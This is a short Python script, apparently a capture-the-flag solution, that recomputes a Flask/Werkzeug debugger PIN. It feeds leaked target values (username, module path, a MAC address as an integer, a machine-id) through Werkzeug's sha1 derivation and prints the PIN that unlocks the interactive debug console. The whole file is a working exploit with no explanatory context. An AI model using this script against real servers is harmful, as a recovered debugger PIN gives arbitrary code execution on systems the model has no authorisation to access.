import hashlib
from itertools import chain
probably_public_bits = [
	'roronoa',#'www-data', # username
	'flask.app',# modname 고정
	'Flask',    # getattr(app, '__name__', getattr(app.__class__, '__name__')) 고정
	'/usr/local/lib/python3.10/site-packages/flask/app.py' 
]
 
private_bits = [
	'2485377957890',  # 02:42:ac:12:00:02
	'5ccbbc99-51c3-4aff-92ad-64e67a5b59ba'   # get_machine_id()
]
 
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode()
    h.update(bit)
h.update(b"cookiesalt")
#h.update(b'shittysalt')
 
cookie_name = '__wzd' + h.hexdigest()[:20]
 
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num
 
print(rv)